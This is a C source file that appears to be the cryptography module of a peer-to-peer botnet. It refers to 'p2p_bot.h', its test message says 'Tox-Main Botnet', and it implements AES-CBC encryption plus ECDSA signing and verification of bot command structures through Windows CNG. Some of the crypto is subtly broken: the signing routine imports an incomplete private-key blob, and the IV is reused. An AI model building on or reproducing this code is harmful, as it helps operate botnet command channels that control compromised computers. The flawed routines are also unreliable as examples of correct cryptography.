#include "p2p_bot.h"
#include <stdio.h>
#include <stdlib.h>

// Initialize encryption context
int crypto_init(CRYPTO_CONTEXT* ctx) {
    if (!ctx) return 0;

    memset(ctx, 0, sizeof(CRYPTO_CONTEXT));

    printf("[Crypto] Initializing AES encryption module...\n");

    // Open AES algorithm provider
    NTSTATUS status = BCryptOpenAlgorithmProvider(&ctx->hAesAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (status != 0) {
        printf("[Crypto] Failed to open AES algorithm provider: 0x%08X\n", status);
        return 0;
    }

    // Set mode to CBC
    status = BCryptSetProperty(ctx->hAesAlg, BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (status != 0) {
        printf("[Crypto] Failed to set CBC mode: 0x%08X\n", status);
        BCryptCloseAlgorithmProvider(ctx->hAesAlg, 0);
        return 0;
    }

    // Generate random key
    BCRYPT_ALG_HANDLE hRngAlg;
    status = BCryptOpenAlgorithmProvider(&hRngAlg, BCRYPT_RNG_ALGORITHM, NULL, 0);
    if (status == 0) {
        status = BCryptGenRandom(hRngAlg, ctx->key, sizeof(ctx->key), 0);
        if (status != 0) {
            printf("[Crypto] Failed to generate random key: 0x%08X\n", status);
            BCryptCloseAlgorithmProvider(hRngAlg, 0);
            BCryptCloseAlgorithmProvider(ctx->hAesAlg, 0);
            return 0;
        }

        status = BCryptGenRandom(hRngAlg, ctx->iv, sizeof(ctx->iv), 0);
        if (status != 0) {
            printf("[Crypto] Failed to generate random IV: 0x%08X\n", status);
            BCryptCloseAlgorithmProvider(hRngAlg, 0);
            BCryptCloseAlgorithmProvider(ctx->hAesAlg, 0);
            return 0;
        }

        BCryptCloseAlgorithmProvider(hRngAlg, 0);
    }
    else {
        printf("[Crypto] Failed to open RNG algorithm provider: 0x%08X\n", status);
        BCryptCloseAlgorithmProvider(ctx->hAesAlg, 0);
        return 0;
    }

    // Generate symmetric key
    status = BCryptGenerateSymmetricKey(ctx->hAesAlg, &ctx->hKey, NULL, 0,
        ctx->key, sizeof(ctx->key), 0);
    if (status != 0) {
        printf("[Crypto] Failed to generate symmetric key: 0x%08X\n", status);
        BCryptCloseAlgorithmProvider(ctx->hAesAlg, 0);
        return 0;
    }

    printf("[Crypto] AES encryption module initialized successfully\n");
    return 1;
}

void crypto_cleanup(CRYPTO_CONTEXT* ctx) {
    if (!ctx) return;

    printf("[Crypto] Cleaning up encryption context...\n");

    if (ctx->hKey) {
        BCryptDestroyKey(ctx->hKey);
        ctx->hKey = NULL;
    }
    if (ctx->hAesAlg) {
        BCryptCloseAlgorithmProvider(ctx->hAesAlg, 0);
        ctx->hAesAlg = NULL;
    }
}

// Encrypt data
int crypto_encrypt(CRYPTO_CONTEXT* ctx, const unsigned char* plaintext, unsigned int plaintext_size,
    unsigned char* ciphertext, unsigned int* ciphertext_size) {
    if (!ctx || !plaintext || !ciphertext || !ciphertext_size) {
        printf("[Crypto] Invalid encryption parameters\n");
        return 0;
    }

    if (*ciphertext_size < plaintext_size + 16) {
        printf("[Crypto] Output buffer too small\n");
        return 0;
    }

    ULONG result_size = 0;
    NTSTATUS status = BCryptEncrypt(ctx->hKey, (PUCHAR)plaintext, plaintext_size, NULL,
        ctx->iv, sizeof(ctx->iv), ciphertext, *ciphertext_size,
        &result_size, BCRYPT_BLOCK_PADDING);

    if (status != 0) {
        printf("[Crypto] Encryption failed: 0x%08X\n", status);
        return 0;
    }

    *ciphertext_size = result_size;
    return 1;
}

// Decrypt data
int crypto_decrypt(CRYPTO_CONTEXT* ctx, const unsigned char* ciphertext, unsigned int ciphertext_size,
    unsigned char* plaintext, unsigned int* plaintext_size) {
    if (!ctx || !ciphertext || !plaintext || !plaintext_size) {
        printf("[Crypto] Invalid decryption parameters\n");
        return 0;
    }

    if (*plaintext_size < ciphertext_size) {
        printf("[Crypto] Output buffer too small\n");
        return 0;
    }

    ULONG result_size = 0;
    NTSTATUS status = BCryptDecrypt(ctx->hKey, (PUCHAR)ciphertext, ciphertext_size, NULL,
        ctx->iv, sizeof(ctx->iv), plaintext, *plaintext_size,
        &result_size, BCRYPT_BLOCK_PADDING);

    if (status != 0) {
        printf("[Crypto] Decryption failed: 0x%08X\n", status);
        return 0;
    }

    *plaintext_size = result_size;
    return 1;
}

// Generate asymmetric key pair
int crypto_generate_keypair(unsigned char* public_key, unsigned char* private_key) {
    printf("[Crypto] Generating ECDSA key pair...\n");

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;

    // Open ECDSA algorithm provider
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_ECDSA_P256_ALGORITHM, NULL, 0);
    if (status != 0) {
        printf("[Crypto] Failed to open ECDSA algorithm provider: 0x%08X\n", status);
        return 0;
    }

    // Generate key pair
    status = BCryptGenerateKeyPair(hAlg, &hKey, 256, 0);
    if (status != 0) {
        printf("[Crypto] Failed to generate key pair: 0x%08X\n", status);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return 0;
    }

    // Finalize key pair generation
    status = BCryptFinalizeKeyPair(hKey, 0);
    if (status != 0) {
        printf("[Crypto] Failed to finalize key pair: 0x%08X\n", status);
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return 0;
    }

    // Export public key
    ULONG public_key_size = 0;
    status = BCryptExportKey(hKey, NULL, BCRYPT_ECCPUBLIC_BLOB, NULL, 0, &public_key_size, 0);
    if (status != 0) {
        printf("[Crypto] Failed to get public key size: 0x%08X\n", status);
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return 0;
    }

    unsigned char* public_key_blob = (unsigned char*)malloc(public_key_size);
    if (!public_key_blob) {
        printf("[Crypto] Failed to allocate memory for public key\n");
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return 0;
    }

    status = BCryptExportKey(hKey, NULL, BCRYPT_ECCPUBLIC_BLOB, public_key_blob,
        public_key_size, &public_key_size, 0);
    if (status != 0) {
        printf("[Crypto] Failed to export public key: 0x%08X\n", status);
        free(public_key_blob);
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return 0;
    }

    // Extract raw public key from BLOB
    if (public_key_size >= sizeof(BCRYPT_ECCKEY_BLOB) + PUBLIC_KEY_SIZE) {
        memcpy(public_key, public_key_blob + sizeof(BCRYPT_ECCKEY_BLOB), PUBLIC_KEY_SIZE);
    }
    else {
        printf("[Crypto] Invalid public key BLOB format\n");
        free(public_key_blob);
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return 0;
    }

    // Export private key
    ULONG private_key_size = 0;
    status = BCryptExportKey(hKey, NULL, BCRYPT_ECCPRIVATE_BLOB, NULL, 0, &private_key_size, 0);
    if (status != 0) {
        printf("[Crypto] Failed to get private key size: 0x%08X\n", status);
        free(public_key_blob);
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return 0;
    }

    unsigned char* private_key_blob = (unsigned char*)malloc(private_key_size);
    if (!private_key_blob) {
        printf("[Crypto] Failed to allocate memory for private key\n");
        free(public_key_blob);
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return 0;
    }

    status = BCryptExportKey(hKey, NULL, BCRYPT_ECCPRIVATE_BLOB, private_key_blob,
        private_key_size, &private_key_size, 0);
    if (status != 0) {
        printf("[Crypto] Failed to export private key: 0x%08X\n", status);
        free(public_key_blob);
        free(private_key_blob);
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return 0;
    }

    // Extract raw private key from BLOB
    if (private_key_size >= sizeof(BCRYPT_ECCKEY_BLOB) + PRIVATE_KEY_SIZE) {
        memcpy(private_key, private_key_blob + sizeof(BCRYPT_ECCKEY_BLOB), PRIVATE_KEY_SIZE);
    }
    else {
        printf("[Crypto] Invalid private key BLOB format\n");
        free(public_key_blob);
        free(private_key_blob);
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return 0;
    }

    free(public_key_blob);
    free(private_key_blob);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    printf("[Crypto] ECDSA key pair generated successfully\n");
    return 1;
}

// Sign data with ECDSA
int crypto_sign(const unsigned char* private_key, const unsigned char* data, unsigned int data_size,
    unsigned char* signature) {

    printf("[Crypto] Signing data with ECDSA P-256...\n");

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BCRYPT_ALG_HANDLE hHashAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    DWORD hashSize = 0;
    DWORD hashObjectSize = 0;
    DWORD signatureSize = 0;
    DWORD tempSize = 0;
    DWORD keyBlobSize = 0;  // 密钥BLOB大小
    PUCHAR hashObject = NULL;
    PUCHAR hash = NULL;
    PUCHAR keyBlob = NULL;
    NTSTATUS status = 0;
    int result = 0;

    // 初始化 BCRYPT_ECCKEY_BLOB
    BCRYPT_ECCKEY_BLOB eccKeyBlob = { 0 };
    eccKeyBlob.dwMagic = BCRYPT_ECDSA_PRIVATE_P256_MAGIC;
    eccKeyBlob.cbKey = 32;

    // 1. 打开ECDSA算法提供程序
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_ECDSA_P256_ALGORITHM, NULL, 0);
    if (status != 0) {
        printf("[Crypto] Failed to open ECDSA algorithm provider: 0x%08X\n", status);
        goto cleanup;
    }

    // 2. 构建私钥BLOB
    keyBlobSize = sizeof(BCRYPT_ECCKEY_BLOB) + PRIVATE_KEY_SIZE * 2;
    keyBlob = (PUCHAR)malloc(keyBlobSize);
    if (!keyBlob) {
        printf("[Crypto] Memory allocation failed for key blob\n");
        goto cleanup;
    }

    // 复制BLOB头部
    memcpy(keyBlob, &eccKeyBlob, sizeof(BCRYPT_ECCKEY_BLOB));
    memcpy(keyBlob + sizeof(BCRYPT_ECCKEY_BLOB), private_key, PRIVATE_KEY_SIZE);

    // 3. 导入私钥
    status = BCryptImportKeyPair(hAlg, NULL, BCRYPT_ECCPRIVATE_BLOB, &hKey,
        keyBlob, keyBlobSize, 0);
    if (status != 0) {
        printf("[Crypto] Failed to import private key: 0x%08X\n", status);
        goto cleanup;
    }

    // 4. 创建哈希对象
    status = BCryptOpenAlgorithmProvider(&hHashAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0);
    if (status != 0) {
        printf("[Crypto] Failed to open SHA256 algorithm: 0x%08X\n", status);
        goto cleanup;
    }

    // 获取哈希对象大小
    status = BCryptGetProperty(hHashAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&hashObjectSize,
        sizeof(DWORD), &tempSize, 0);
    if (status != 0) {
        printf("[Crypto] Failed to get hash object size: 0x%08X\n", status);
        goto cleanup;
    }

    hashObject = (PUCHAR)malloc(hashObjectSize);
    if (!hashObject) {
        printf("[Crypto] Memory allocation failed for hash object\n");
        goto cleanup;
    }

    // 获取哈希值大小
    status = BCryptGetProperty(hHashAlg, BCRYPT_HASH_LENGTH, (PUCHAR)&hashSize,
        sizeof(DWORD), &tempSize, 0);
    if (status != 0) {
        printf("[Crypto] Failed to get hash length: 0x%08X\n", status);
        goto cleanup;
    }

    hash = (PUCHAR)malloc(hashSize);
    if (!hash) {
        printf("[Crypto] Memory allocation failed for hash\n");
        goto cleanup;
    }

    // 创建哈希对象
    status = BCryptCreateHash(hHashAlg, &hHash, hashObject, hashObjectSize, NULL, 0, 0);
    if (status != 0) {
        printf("[Crypto] Failed to create hash object: 0x%08X\n", status);
        goto cleanup;
    }

    // 计算哈希
    status = BCryptHashData(hHash, (PUCHAR)data, data_size, 0);
    if (status != 0) {
        printf("[Crypto] Failed to hash data: 0x%08X\n", status);
        goto cleanup;
    }

    // 完成哈希计算
    status = BCryptFinishHash(hHash, hash, hashSize, 0);
    if (status != 0) {
        printf("[Crypto] Failed to finish hash: 0x%08X\n", status);
        goto cleanup;
    }

    // 5. 对哈希值进行签名
    status = BCryptSignHash(hKey, NULL, hash, hashSize, NULL, 0, &signatureSize, 0);
    if (status != 0 || signatureSize > SIGNATURE_SIZE) {
        printf("[Crypto] Failed to get signature size: 0x%08X\n", status);
        goto cleanup;
    }

    status = BCryptSignHash(hKey, NULL, hash, hashSize, signature, signatureSize, &signatureSize, 0);
    if (status == 0) {
        printf("[Crypto] ECDSA signing successful\n");
        result = 1;
    }
    else {
        printf("[Crypto] ECDSA signing failed: 0x%08X\n", status);
    }

cleanup:
    if (hHash) BCryptDestroyHash(hHash);
    if (hashObject) free(hashObject);
    if (hash) free(hash);
    if (hHashAlg) BCryptCloseAlgorithmProvider(hHashAlg, 0);
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    if (keyBlob) free(keyBlob);

    return result;
}

// 验证签名
int crypto_verify(const unsigned char* public_key, const unsigned char* data, unsigned int data_size,
    const unsigned char* signature) {

    printf("[Crypto] Verifying ECDSA P-256 signature...\n");

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BCRYPT_ALG_HANDLE hHashAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    DWORD hashSize = 0;
    DWORD tempSize = 0;
    DWORD keyBlobSize = 0;  // 密钥BLOB大小
    PUCHAR hash = NULL;
    PUCHAR keyBlob = NULL;
    NTSTATUS status = 0;
    int result = 0;

    // 初始化 BCRYPT_ECCKEY_BLOB
    BCRYPT_ECCKEY_BLOB eccKeyBlob = { 0 };
    eccKeyBlob.dwMagic = BCRYPT_ECDSA_PUBLIC_P256_MAGIC;
    eccKeyBlob.cbKey = 32;

    // 1. 打开ECDSA算法提供程序
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_ECDSA_P256_ALGORITHM, NULL, 0);
    if (status != 0) {
        printf("[Crypto] Failed to open ECDSA algorithm provider: 0x%08X\n", status);
        goto cleanup;
    }

    // 2. 构建公钥BLOB
    keyBlobSize = sizeof(BCRYPT_ECCKEY_BLOB) + PUBLIC_KEY_SIZE;
    keyBlob = (PUCHAR)malloc(keyBlobSize);
    if (!keyBlob) {
        printf("[Crypto] Memory allocation failed for key blob\n");
        goto cleanup;
    }

    memcpy(keyBlob, &eccKeyBlob, sizeof(BCRYPT_ECCKEY_BLOB));
    memcpy(keyBlob + sizeof(BCRYPT_ECCKEY_BLOB), public_key, PUBLIC_KEY_SIZE);

    // 3. 导入公钥
    status = BCryptImportKeyPair(hAlg, NULL, BCRYPT_ECCPUBLIC_BLOB, &hKey,
        keyBlob, keyBlobSize, 0);
    if (status != 0) {
        printf("[Crypto] Failed to import public key: 0x%08X\n", status);
        goto cleanup;
    }

    // 4. 创建哈希对象
    status = BCryptOpenAlgorithmProvider(&hHashAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0);
    if (status != 0) {
        printf("[Crypto] Failed to open SHA256 algorithm: 0x%08X\n", status);
        goto cleanup;
    }

    // 获取哈希值大小
    status = BCryptGetProperty(hHashAlg, BCRYPT_HASH_LENGTH, (PUCHAR)&hashSize,
        sizeof(DWORD), &tempSize, 0);
    if (status != 0) {
        printf("[Crypto] Failed to get hash length: 0x%08X\n", status);
        goto cleanup;
    }

    hash = (PUCHAR)malloc(hashSize);
    if (!hash) {
        printf("[Crypto] Memory allocation failed for hash\n");
        goto cleanup;
    }

    // 创建哈希对象
    status = BCryptCreateHash(hHashAlg, &hHash, NULL, 0, NULL, 0, 0);
    if (status != 0) {
        printf("[Crypto] Failed to create hash object: 0x%08X\n", status);
        goto cleanup;
    }

    // 计算哈希
    status = BCryptHashData(hHash, (PUCHAR)data, data_size, 0);
    if (status != 0) {
        printf("[Crypto] Failed to hash data: 0x%08X\n", status);
        goto cleanup;
    }

    // 完成哈希计算
    status = BCryptFinishHash(hHash, hash, hashSize, 0);
    if (status != 0) {
        printf("[Crypto] Failed to finish hash: 0x%08X\n", status);
        goto cleanup;
    }

    // 5. 验证签名
    status = BCryptVerifySignature(hKey, NULL, hash, hashSize,
        (PUCHAR)signature, SIGNATURE_SIZE, 0);

    if (status == 0) {
        printf("[Crypto] ECDSA signature verification successful\n");
        result = 1;
    }
    else {
        printf("[Crypto] ECDSA signature verification failed: 0x%08X\n", status);
    }

cleanup:
    if (hHash) BCryptDestroyHash(hHash);
    if (hash) free(hash);
    if (hHashAlg) BCryptCloseAlgorithmProvider(hHashAlg, 0);
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    if (keyBlob) free(keyBlob);

    return result;
}

// Simple encryption test function (for debugging)
void crypto_test() {
    printf("\n=== Crypto Module Test ===\n");

    CRYPTO_CONTEXT ctx;
    if (!crypto_init(&ctx)) {
        printf("[Test] Crypto module initialization failed\n");
        return;
    }

    // Test data
    unsigned char plaintext[] = "Hello, Tox-Main Botnet!";
    unsigned char ciphertext[256];
    unsigned char decrypted[256];
    unsigned int ciphertext_size = sizeof(ciphertext);
    unsigned int decrypted_size = sizeof(decrypted);

    printf("[Test] Original data: %s\n", plaintext);

    // Encryption test
    if (crypto_encrypt(&ctx, plaintext, (unsigned int)(strlen((char*)plaintext) + 1), ciphertext, &ciphertext_size)) {
        printf("[Test] Encryption successful, ciphertext size: %u bytes\n", ciphertext_size);

        // Decryption test
        if (crypto_decrypt(&ctx, ciphertext, ciphertext_size, decrypted, &decrypted_size)) {
            printf("[Test] Decryption successful: %s\n", decrypted);
        }
        else {
            printf("[Test] Decryption failed\n");
        }
    }
    else {
        printf("[Test] Encryption failed\n");
    }

    // Test key pair generation
    unsigned char pub_key[PUBLIC_KEY_SIZE];
    unsigned char priv_key[PRIVATE_KEY_SIZE];
    if (crypto_generate_keypair(pub_key, priv_key)) {
        printf("[Test] Key pair generation successful\n");

        // Test signing with ECDSA
        unsigned char signature[SIGNATURE_SIZE];

        // 创建测试命令数据
        COMMAND_DATA test_cmd;
        strcpy_s(test_cmd.command, sizeof(test_cmd.command), "test_command");
        strcpy_s(test_cmd.sender_pub_key, sizeof(test_cmd.sender_pub_key), "test_key");
        test_cmd.timestamp = get_timestamp();
        test_cmd.arg_count = 1;
        strcpy_s(test_cmd.args[0], sizeof(test_cmd.args[0]), "test_arg");

        if (crypto_sign(priv_key, (unsigned char*)&test_cmd, sizeof(test_cmd), signature)) {
            printf("[Test] ECDSA signing successful\n");

            // Test verification
            if (crypto_verify(pub_key, (unsigned char*)&test_cmd, sizeof(test_cmd), signature)) {
                printf("[Test] ECDSA verification successful\n");
            }
            else {
                printf("[Test] ECDSA verification failed\n");
            }
        }
        else {
            printf("[Test] ECDSA signing failed\n");
        }
    }
    else {
        printf("[Test] Key pair generation failed\n");
    }

    crypto_cleanup(&ctx);
    printf("=== Crypto test completed ===\n\n");
}